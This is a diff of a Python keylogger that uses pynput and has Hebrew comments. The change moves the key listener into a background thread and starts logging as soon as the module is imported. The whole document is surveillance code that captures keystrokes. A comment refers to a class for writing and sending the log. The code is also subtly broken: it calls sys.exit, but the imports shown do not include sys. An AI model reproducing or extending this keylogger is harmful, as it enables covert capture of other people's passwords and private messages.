@@ -1,6 +1,6 @@
 from abc import ABC,abstractmethod
 from pynput.keyboard import Key,Listener
-
+import threading
 
 
 class IKeyLogger(ABC):
@@ -33,11 +33,6 @@ class KeyLogger(IKeyLogger):
         except AttributeError:
             pass
 
-#  מחלקה מופשטת של כותב. מורישה מתודה של כתוב ומתודה של שלח
-    def start_logging(self):
-        with Listener(on_press=KeyLogger.__on_press, on_release=KeyLogger.__on_release) as listener:
-            listener.join()
-
     # אחראי ליפות את המקש
     @staticmethod
     def nurmal_key(key):
@@ -57,8 +52,17 @@ class KeyLogger(IKeyLogger):
             else:
                 return key_list[1]
 
+    #  מחלקה מופשטת של כותב. מורישה מתודה של כתוב ומתודה של שלח
+    def start_logging(self):
+        def _statr():
+            with Listener(on_press=KeyLogger.__on_press, on_release=self.__on_release) as l:
+                self.lisiner = l
+                self.lisiner.join()
+        ran = threading.Thread(target=_statr)
+        ran.start()
+
     def stop_logging(self) -> None:
-        exit(0)
+        sys.exit(0)
 
 KeyLogger().start_logging()
 
